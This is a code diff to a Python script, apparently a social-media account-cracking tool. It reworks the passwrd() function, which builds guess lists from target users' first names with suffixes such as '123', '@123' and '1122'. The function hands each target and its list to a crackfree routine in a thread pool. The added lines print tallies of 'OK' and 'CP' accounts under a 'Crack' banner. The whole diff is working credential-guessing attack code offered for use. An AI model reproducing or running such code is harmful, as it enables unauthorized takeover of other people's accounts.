@@ -432,43 +432,12 @@ def passwrd():
                 if len(frs)<3:
                     pass
                 else:
-                    pwv.append(frs+'1212')
+                    pwv.append(frs+'12')
                     pwv.append(frs+'123')
                     pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
                     pwv.append(frs+'123456')
-                    pwv.append(frs+'1122')
-                    pwv.append(frs+'112233')
-                    pwv.append(frs+frs)
-                    pwv.append(frs+'123@')
-                    pwv.append(frs+'1234567')
-                    pwv.append(frs+'12345678')   
-                    pwv.append(frs+'123456789')   
-                    pwv.append(frs+'1234567890') 
-            else:
-                if len(frs)<3:
                     pwv.append(nmf)
-                else:
-                    pwv.append(frs+'1212')
-                    pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
-                    pwv.append(frs+'12345')
-                    pwv.append(frs+'123456')
-                    pwv.append(frs+'1122')
-                    pwv.append(frs+'112233')
-                    pwv.append(frs+frs)
-                    pwv.append(frs+'123@')
-                    pwv.append(frs+'1234567')
-                    pwv.append(frs+'12345678')   
-                    pwv.append(frs+'123456789')   
-                    pwv.append(frs+'1234567890')	
-           	   
-	             
-	            pwv.append(frs+'12')
-                    pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
-                    pwv.append(frs+'12345')
-                    pwv.append(frs+'123456')
                     pwv.append('57273200')
                     pwv.append(frs+'@123')
                     pwv.append(frs+'@')
@@ -477,8 +446,28 @@ def passwrd():
                     pwv.append(frs+'@@@@')
                     pwv.append(frs+'@#')
                     pwv.append(frs+'1122')
-                    
-                 
+                    pwv.append(frs+'11')
+                    pwv.append(frs+'111')
+            else:
+                if len(frs)<3:
+                    pwv.append(nmf)
+                else:
+                    pwv.append(frs+'12')
+                    pwv.append(frs+'123')
+                    pwv.append(frs+'1234')
+                    pwv.append(frs+'12345')
+                    pwv.append(frs+'123456')
+                    pwv.append(nmf)
+                    pwv.append('57273200')
+                    pwv.append(frs+'@123')
+                    pwv.append(frs+'@')
+                    pwv.append(frs+'@@')
+                    pwv.append(frs+'@@@')
+                    pwv.append(frs+'@@@@')
+                    pwv.append(frs+'@#')
+                    pwv.append(frs+'1122')
+                    pwv.append(frs+'11')
+                    pwv.append(frs+'111')
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
@@ -493,6 +482,14 @@ def passwrd():
                 pool.submit(crackfree,idf,pwv)
             else:
                 pool.submit(crackfree,idf,pwv)
+    print('\n\033[1;37m===================================')
+    print('\033[97;1m[\033[92;1m+\033[97;1m] Crack Tawaw Buu :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
+    print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(ok))
+    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(cp))
+    print('\n\033[1;37m===================================')
+    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
+    os.system("python V2.py")
+    exit()
    
  
 #--------------------[ METODE-B-API ]-----------------#
